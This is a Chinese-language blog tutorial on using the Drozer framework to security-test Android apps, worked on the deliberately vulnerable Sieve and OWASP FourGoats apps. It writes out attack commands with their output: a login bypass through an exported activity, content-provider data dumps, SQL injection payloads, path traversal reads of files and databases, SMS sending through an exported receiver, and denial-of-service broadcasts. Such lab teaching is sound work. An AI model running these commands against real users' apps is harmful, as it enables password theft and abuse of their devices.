@@ -1,0 +1,504 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <meta name="description" content="si1ent">
+  <meta name="keyword" content="hexo-theme, vuejs">
+  
+    <link rel="shortcut icon" href="/css/images/logo.png">
+  
+  <title>
+    
+      Drozer检测学习 | si1ent
+    
+  </title>
+  <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/tomorrow.min.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/css/plugins/gitment.css">
+
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/geopattern/1.2.3/js/geopattern.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.js"></script>
+  
+    
+<script src="/js/qrious.js"></script>
+
+  
+  
+    
+<script src="/js/gitment.js"></script>
+
+  
+  
+  
+    <!-- MathJax support START -->
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <!-- MathJax support END -->
+  
+
+
+  
+<meta name="generator" content="Hexo 5.2.0"></head>
+<div class="wechat-share">
+  <img src="/css/images/logo.png" />
+</div>
+
+  <body>
+    <header class="header fixed-header">
+  <div class="header-container">
+    <a class="home-link" href="/">
+      <div class="logo"></div>
+      <span>si1ent</span>
+    </a>
+    <ul class="right-list">
+      
+        <li class="list-item">
+          
+            <a href="/" class="item-link">Home</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/tags/" class="item-link">Tags</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/archives/" class="item-link">Archives</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/about/" class="item-link">About</a>
+          
+        </li>
+      
+    </ul>
+    <div class="menu">
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+    </div>
+    <div class="menu-mask">
+      <ul class="menu-list">
+        
+          <li class="menu-item">
+            
+              <a href="/" class="menu-link">Home</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/tags/" class="menu-link">Tags</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/archives/" class="menu-link">Archives</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/about/" class="menu-link">About</a>
+            
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</header>
+
+    <div id="article-banner">
+  <h2>Drozer检测学习</h2>
+  <p class="post-date">2020-06-20</p>
+  <div class="arrow-down">
+    <a href="javascript:;"></a>
+  </div>
+</div>
+<main class="app-body flex-box">
+  <!-- Article START -->
+  <article class="post-article">
+    <section class="markdown-content"><p>Drozer是MWR Labs开发的一款针对Android系统的综合安全测试框架。Drozer可以通过与Dalivik 虚拟机,以及其它应用程序的IPC端点以及底层操作系统的交互，避免正处于开发阶段，或者部署于你的组织的android应用程序和设备暴露出不可接受的安全风险。</p>
+<h4 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">JDK</span><br><span class="line">python</span><br><span class="line">Android SDK</span><br><span class="line">adb</span><br><span class="line">drozer-agent(安装至Android)</span><br><span class="line">drozer(PC端)</span><br><span class="line">sieve.apk</span><br><span class="line">fourgoats.apk</span><br></pre></td></tr></table></figure>
+
+<h4 id="组件及描述"><a href="#组件及描述" class="headerlink" title="组件及描述"></a>组件及描述</h4><p><img src="/images/drozer/image-20200628111010674.png" alt="image-20200628111010674"></p>
+<center>部分组件概述</center>
+
+<h3 id="环境部署"><a href="#环境部署" class="headerlink" title="环境部署"></a>环境部署</h3><p>drozer部署</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/mwrlabs/drozer/releases/">drozer(PC端)下载</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.si1ent.xyz/Tools/drozer-agent-2.3.4.apk">drozer(客户端)下载</a></p>
+<p>安装参考网上.</p>
+<h4 id="sieve"><a href="#sieve" class="headerlink" title="sieve"></a>sieve</h4><p><a target="_blank" rel="noopener" href="http://www.si1ent.xyz/Tools/sieve.apk">sieve</a></p>
+<p>Sieve是一个小型的Password Manager应用程序，用于展示Android中的一些常见漏洞应用。<br>首次启动Sieve时，它要求用户设置一个16个字符的“主密码”和一个4位数的引脚，用于保护用户稍后输入的密码。 用户可以使用Sieve存储各种服务的密码，如果需要正确的凭据，可以在以后检索。</p>
+<h4 id="Vul-Broadcast"><a href="#Vul-Broadcast" class="headerlink" title="Vul_Broadcast"></a>Vul_Broadcast</h4><p><a target="_blank" rel="noopener" href="http://www.si1ent.xyz/Tools/Vul_BroadcastReceiver.apk">Vul_Broadcast</a></p>
+<p>Vul_Broadcast是一款专门用于检测Broadcast组件安全性而设计的APP程序。</p>
+<h4 id="fourgoats"><a href="#fourgoats" class="headerlink" title="fourgoats"></a>fourgoats</h4><p><a target="_blank" rel="noopener" href="http://www.si1ent/xyz/Tools/goatdroid.apk">fourgoats</a></p>
+<p>fourgoats是OWASP项目内一款模拟检测Broadcast组件安全性，同时也存在WebView代码执行漏洞等。</p>
+<h3 id="检测实战"><a href="#检测实战" class="headerlink" title="检测实战"></a>检测实战</h3><p>以下检测因部分APP内并不都存在可导出的组件信息，所以结合网络上的APK分别测试不同组件产生的危害。</p>
+<h4 id="0、连接"><a href="#0、连接" class="headerlink" title="0、连接"></a>0、连接</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">手机提前开启调试模式</span><br><span class="line">adb forward tcp:31415 tcp:31415</span><br><span class="line">31415</span><br><span class="line">//查看连接(如下表示连接正常)</span><br><span class="line">adb devices</span><br><span class="line">List of devices attached</span><br><span class="line">9SQ4Y9FU99999999	device</span><br><span class="line">//drozer连接</span><br><span class="line">drozer console connect</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/drozer/image-20200628144434578.png" alt="image-20200628144434578"></p>
+<h4 id="1、包名检测"><a href="#1、包名检测" class="headerlink" title="1、包名检测"></a>1、包名检测</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">dz&gt;</span><span class="bash"> run app.package.list</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/drozer/image-20200628144457885.png" alt="image-20200628144457885"></p>
+<center>部分APP</center>
+
+
+<h4 id="2、sieve实例"><a href="#2、sieve实例" class="headerlink" title="2、sieve实例"></a>2、sieve实例</h4><p>因Android内包名是唯一标识，所以可根据名称进行检索</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">dz&gt;</span><span class="bash"> run app.package.list -f sieve</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/drozer/image-20200628144824371.png" alt="image-20200628144824371"></p>
+<h4 id="3、APP信息"><a href="#3、APP信息" class="headerlink" title="3、APP信息"></a>3、APP信息</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">dz&gt;</span><span class="bash"> run app.package.info -a com.mwr.example.sieve</span></span><br><span class="line">Package: com.mwr.example.sieve</span><br><span class="line">  Application Label: Sieve</span><br><span class="line">  Process Name: com.mwr.example.sieve</span><br><span class="line">  Version: 1.0</span><br><span class="line">  Data Directory: /data/data/com.mwr.example.sieve</span><br><span class="line">  APK Path: /data/app/com.mwr.example.sieve-1/base.apk</span><br><span class="line">  UID: 10104</span><br><span class="line">  GID: [1028, 1015, 3003]</span><br><span class="line">  Shared Libraries: null</span><br><span class="line">  Shared User ID: null</span><br><span class="line">  Uses Permissions:</span><br><span class="line">  - android.permission.READ_EXTERNAL_STORAGE</span><br><span class="line">  - android.permission.WRITE_EXTERNAL_STORAGE</span><br><span class="line">  - android.permission.INTERNET</span><br><span class="line">  Defines Permissions:</span><br><span class="line">  - com.mwr.example.sieve.READ_KEYS</span><br><span class="line">  - com.mwr.example.sieve.WRITE_KEYS</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/drozer/image-20200628144936720.png" alt="image-20200628144936720"></p>
+<h4 id="4、漏洞检测"><a href="#4、漏洞检测" class="headerlink" title="4、漏洞检测"></a>4、漏洞检测</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">dz&gt;</span><span class="bash"> run app.package.attacksurface com.mwr.example.sieve</span></span><br><span class="line">Attack Surface:</span><br><span class="line">  3 activities exported</span><br><span class="line">  0 broadcast receivers exported</span><br><span class="line">  2 content providers exported</span><br><span class="line">  2 services exported</span><br><span class="line">    is debuggable</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/drozer/image-20200628145213646.png" alt="image-20200628145213646"></p>
+<h4 id="5、Activities"><a href="#5、Activities" class="headerlink" title="5、Activities"></a>5、Activities</h4><p>Activities组件是Android新建APP每个功能均会存在的Activities页面；同样如果未对某些页面作限制可能导致绕过登录入口而进入某功能。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">dz&gt;</span><span class="bash"> run app.activity.info -a com.mwr.example.sieve</span></span><br><span class="line">Package: com.mwr.example.sieve</span><br><span class="line">  com.mwr.example.sieve.FileSelectActivity</span><br><span class="line">    Permission: null</span><br><span class="line">  com.mwr.example.sieve.MainLoginActivity</span><br><span class="line">    Permission: null</span><br><span class="line">  com.mwr.example.sieve.PWList	//可倒出，未设置权限认证</span><br><span class="line">    Permission: null</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/drozer/image-20200628145406392.png" alt="image-20200628145406392"></p>
+<h4 id="6、Activities攻击"><a href="#6、Activities攻击" class="headerlink" title="6、Activities攻击"></a>6、Activities攻击</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//会直接绕过登录,进入密码添加.</span><br><span class="line"><span class="meta">dz&gt;</span><span class="bash"> run app.activity.start --component com.mwr.example.sieve com.mwr.example.sieve.PWList</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/drozer/image-20200628145915024.png" alt="image-20200628145915024"></p>
+<h4 id="7、ContentProvider"><a href="#7、ContentProvider" class="headerlink" title="7、ContentProvider"></a>7、ContentProvider</h4><p>Android平台提供了Content Provider使一个应用程序的指定数据集提供给其他应用程序。这些数据可以存储在文件系统中、在一个SQLite数据库、或以任何其他合理的方式。其他应用可以通过ContentResolver类从该内容提供者中获取或存入数据。只有需要在多个应用程序间共享数据是才需要内容提供者。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">dz&gt;</span><span class="bash"> run scanner.provider.finduris -a com.mwr.example.sieve</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/drozer/image-20200628151122062.png" alt="image-20200628151122062"></p>
+<center>Able to Query可查询数据</center>
+
+<h4 id="8、ContentProvider攻击"><a href="#8、ContentProvider攻击" class="headerlink" title="8、ContentProvider攻击"></a>8、ContentProvider攻击</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">dz&gt;</span><span class="bash"> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys/</span></span><br><span class="line">或</span><br><span class="line"><span class="meta">dz&gt;</span><span class="bash"> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/drozer/image-20200628152212737.png" alt="image-20200628152212737"></p>
+<center>如上数据泄露</center>
+
+<h5 id="8-1、SQL注入"><a href="#8-1、SQL注入" class="headerlink" title="8.1、SQL注入"></a>8.1、SQL注入</h5><p>Android使用SQLite来存储数据，也可能造成SQL注入漏洞。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ -<span class="literal">-projection</span> <span class="string">&quot;&#x27;&quot;</span>			//提交单引号测试(如下报错)</span><br><span class="line">unrecognized token: <span class="string">&quot;&#x27; FROM Passwords&quot;</span> (code <span class="number">1</span>): , <span class="keyword">while</span> compiling: <span class="built_in">SELECT</span> <span class="string">&#x27; FROM Passwords</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/drozer/image-20200628152803161.png" alt="image-20200628152803161"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">dz&gt;</span><span class="bash"> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection <span class="string">&quot;&#x27;&quot;</span></span></span><br><span class="line">unrecognized token: &quot;&#x27;)&quot; (code 1): , while compiling: SELECT * FROM Passwords WHERE (&#x27;)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">列出数据库中所有表及相关结构信息</span><br><span class="line"><span class="meta">dz&gt;</span><span class="bash"> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection <span class="string">&quot;* FROM SQLITE_MASTER WHERE type=&#x27;table&#x27;;–&quot;</span></span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/drozer/image-20200628153216874.png" alt="image-20200628153216874"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查询其他表</span><br><span class="line"><span class="meta">dz&gt;</span><span class="bash"> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection <span class="string">&quot;* FROM Key;–&quot;</span></span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/drozer/image-20200628153439019.png" alt="image-20200628153439019"></p>
+<h5 id="8-2、目录遍历"><a href="#8-2、目录遍历" class="headerlink" title="8.2、目录遍历"></a>8.2、目录遍历</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//检测存在目录遍历</span><br><span class="line"><span class="meta">dz&gt;</span><span class="bash"> run scanner.provider.traversal -a com.mwr.example.sieve</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/drozer/image-20200628154719291.png" alt="image-20200628154719291"></p>
+<h5 id="8-3、读取敏感信息"><a href="#8-3、读取敏感信息" class="headerlink" title="8.3、读取敏感信息"></a>8.3、读取敏感信息</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//读取手机内信息</span><br><span class="line">run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/drozer/image-20200628155031780.png" alt="image-20200628155031780"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//下载文件到本地</span><br><span class="line">run app.provider.download content://com.mwr.example.sieve.FileBackupProvider/data/data/com.mwr.example.sieve/databases/database.db ./database.db</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/drozer/image-20200628155519778.png" alt="image-20200628155519778"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">下载是sqlite文件并保存有主密码</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/drozer/image-20200628155856692.png" alt="image-20200628155856692"></p>
+<h5 id="8-4、自动检测"><a href="#8-4、自动检测" class="headerlink" title="8.4、自动检测"></a>8.4、自动检测</h5><p>以上了解存在SQL注入和目录遍历漏洞，同样drozer提供了自动检测以上漏洞。(建议开始检测此组件前直接扫描是否存在SQL注入、目录遍历)</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//自动检测SQL注入</span><br><span class="line"><span class="meta">dz&gt;</span><span class="bash"> run scanner.provider.injection -a com.mwr.example.sieve</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/drozer/image-20200628160315252.png" alt="image-20200628160315252"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//自动检测目录遍历</span><br><span class="line"><span class="meta">dz&gt;</span><span class="bash"> run scanner.provider.traversal -a com.mwr.example.sieve</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/drozer/image-20200628160431455.png" alt="image-20200628160431455"></p>
+<h4 id="9、Services"><a href="#9、Services" class="headerlink" title="9、Services"></a>9、Services</h4><p>一个 Service 是没有界面且能长时间运行于后台的应用组件，其它应用的组件可以启动一个服务运行于后台，即使用户切换到另一个应用也会继续运行；另外，一个组件可以绑定到一 个service来进行交互，即使这个交互是进程间通讯也没问题.例如，一个 service 可能处理网络事物，播放音乐，执行文件 I/O，或与一个内容提供者交互，所有这些都在后台进行。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//检测service</span><br><span class="line"><span class="meta">dz&gt;</span><span class="bash"> run app.service.start --action com.mwr.example.sieve.AuthService</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="10、Broadcast"><a href="#10、Broadcast" class="headerlink" title="10、Broadcast"></a>10、Broadcast</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//检测Broadcast组件</span><br><span class="line"><span class="meta">dz&gt;</span><span class="bash"> run app.broadcast.info -a org.owasp.goatdroid.fourgoats</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/drozer/image-20200628163232216.png" alt="image-20200628163232216"></p>
+<p>(APK未加壳直接反编译获取指定参数)</p>
+<p>源代码参数phoneNumber和massage，会发送Your text message has been sent!</p>
+<p><img src="/images/drozer/image-20200628190616482.png" alt="image-20200628190616482"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//发送恶意代码</span><br><span class="line"><span class="meta">dz&gt;</span><span class="bash"> run app.broadcast.send --component org.owasp.goatdroid.fourgoats org.owasp.goatdroid.fourgoats.broadcastreceivers.SendSMSNowReceiver --extra string phoneNumber 123456789 --extra string message 123</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/drozer/image-20200628174809779.png" alt="image-20200628174809779"></p>
+<p>手机端提示信息发送成功提醒</p>
+<img src="/images/drozer/image-20200628174909868.png" alt="image-20200628174909868" style="zoom:50%;" />
+
+<h4 id="11、Vul实战"><a href="#11、Vul实战" class="headerlink" title="11、Vul实战"></a>11、Vul实战</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//发送恶意数据到手机号上</span><br><span class="line"><span class="meta">dz&gt;</span><span class="bash"> run app.broadcast.send --component com.isi.vul_broadcastreceiver com.isi.vul_broadcastreceiver.MyBroadCastReceiver --extra sting number 18225xxxxx</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="12、拒绝服务"><a href="#12、拒绝服务" class="headerlink" title="12、拒绝服务"></a>12、拒绝服务</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//拒绝服务分两种空 actoin 和空 extras</span><br><span class="line">//空action</span><br><span class="line"><span class="meta">dz&gt;</span><span class="bash"> run app.broadcast.send --component com.isi.vul_broadcastreceiver com.isi.vul_broadcastreceiver.MyBroadCastReceiver</span></span><br><span class="line">//空extras</span><br><span class="line"><span class="meta">dz&gt;</span><span class="bash"> run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS</span></span><br></pre></td></tr></table></figure>
+
+<img src="/images/drozer/image-20200628194446420.png" alt="image-20200628194446420" style="zoom:50%;" />
+
+<h3 id="WebView代码执行检测"><a href="#WebView代码执行检测" class="headerlink" title="WebView代码执行检测"></a>WebView代码执行检测</h3><p>1、检测模版安装</p>
+<p>开启检测前需提前安装模块<code>checkjavascriptbridge</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">dz&gt;</span><span class="bash"> module install jubax.javascript</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/drozer/image-20200628200631521.png" alt="image-20200628200631521"></p>
+<p>2、执行命令检测手机内所有APP</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">dz&gt;</span><span class="bash"> run scanner.misc.checkjavascriptbridge</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/drozer/image-20200628200729336.png" alt="image-20200628200729336"></p>
+<p>如果漏洞存在会提醒</p>
+<p><img src="/images/drozer/image-20200628200810091.png" alt="image-20200628200810091"></p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>以上总结其实网络上也有很多，只是想总结出来后让自己能明白和了解到关于Android应用组件的检测项及涉及工具。当然Drozer这款综合型检测框架还有很多值得学习，比如写一些模块让检测更加自动化。</p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://showmeshell.top/2018/09/28/How-to-use-drozer/</span><br><span class="line">https://bbs.pediy.com/thread-219107.htm</span><br></pre></td></tr></table></figure>
+</section>
+    <!-- Tags START -->
+    
+      <div class="tags">
+        <span>Tags:</span>
+        
+  <a href="/tags#移动应用安全" >
+    <span class="tag-code">移动应用安全</span>
+  </a>
+
+      </div>
+    
+    <!-- Tags END -->
+    <!-- NAV START -->
+    
+  <div class="nav-container">
+    <!-- reverse left and right to put prev and next in a more logic postition -->
+    
+      <a class="nav-left" href="/2020/06/18/DNS-Log-Injection/">
+        <span class="nav-arrow">← </span>
+        
+          DNS Log Injection
+        
+      </a>
+    
+    
+      <a class="nav-right" href="/2020/07/05/Jboss%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/">
+        
+          Jboss漏洞汇总
+        
+        <span class="nav-arrow"> →</span>
+      </a>
+    
+  </div>
+
+    <!-- NAV END -->
+    <!-- 打赏 START -->
+    
+      <div class="money-like">
+        <div class="reward-btn">
+          赏
+          <span class="money-code">
+            <span class="alipay-code">
+              <div class="code-image"></div>
+              <b>使用支付宝打赏</b>
+            </span>
+            <span class="wechat-code">
+              <div class="code-image"></div>
+              <b>使用微信打赏</b>
+            </span>
+          </span>
+        </div>
+        <p class="notice">若你觉得我的文章对你有帮助，欢迎点击上方按钮对我打赏</p>
+      </div>
+    
+    <!-- 打赏 END -->
+    <!-- 二维码 START -->
+    
+      <div class="qrcode">
+        <canvas id="share-qrcode"></canvas>
+        <p class="notice">扫描二维码，分享此文章</p>
+      </div>
+    
+    <!-- 二维码 END -->
+    
+      <!-- Gitment START -->
+      <div id="comments"></div>
+      <!-- Gitment END -->
+    
+  </article>
+  <!-- Article END -->
+  <!-- Catalog START -->
+  
+    <aside class="catalog-container">
+  <div class="toc-main">
+    <strong class="toc-title">Catalog</strong>
+    
+      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">环境配置</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E7%BB%84%E4%BB%B6%E5%8F%8A%E6%8F%8F%E8%BF%B0"><span class="toc-nav-number">2.</span> <span class="toc-nav-text">组件及描述</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2"><span class="toc-nav-number"></span> <span class="toc-nav-text">环境部署</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#sieve"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">sieve</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#Vul-Broadcast"><span class="toc-nav-number">2.</span> <span class="toc-nav-text">Vul_Broadcast</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#fourgoats"><span class="toc-nav-number">3.</span> <span class="toc-nav-text">fourgoats</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E6%A3%80%E6%B5%8B%E5%AE%9E%E6%88%98"><span class="toc-nav-number"></span> <span class="toc-nav-text">检测实战</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#0%E3%80%81%E8%BF%9E%E6%8E%A5"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">0、连接</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#1%E3%80%81%E5%8C%85%E5%90%8D%E6%A3%80%E6%B5%8B"><span class="toc-nav-number">2.</span> <span class="toc-nav-text">1、包名检测</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#2%E3%80%81sieve%E5%AE%9E%E4%BE%8B"><span class="toc-nav-number">3.</span> <span class="toc-nav-text">2、sieve实例</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#3%E3%80%81APP%E4%BF%A1%E6%81%AF"><span class="toc-nav-number">4.</span> <span class="toc-nav-text">3、APP信息</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#4%E3%80%81%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B"><span class="toc-nav-number">5.</span> <span class="toc-nav-text">4、漏洞检测</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#5%E3%80%81Activities"><span class="toc-nav-number">6.</span> <span class="toc-nav-text">5、Activities</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#6%E3%80%81Activities%E6%94%BB%E5%87%BB"><span class="toc-nav-number">7.</span> <span class="toc-nav-text">6、Activities攻击</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#7%E3%80%81ContentProvider"><span class="toc-nav-number">8.</span> <span class="toc-nav-text">7、ContentProvider</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#8%E3%80%81ContentProvider%E6%94%BB%E5%87%BB"><span class="toc-nav-number">9.</span> <span class="toc-nav-text">8、ContentProvider攻击</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#8-1%E3%80%81SQL%E6%B3%A8%E5%85%A5"><span class="toc-nav-number">9.1.</span> <span class="toc-nav-text">8.1、SQL注入</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" 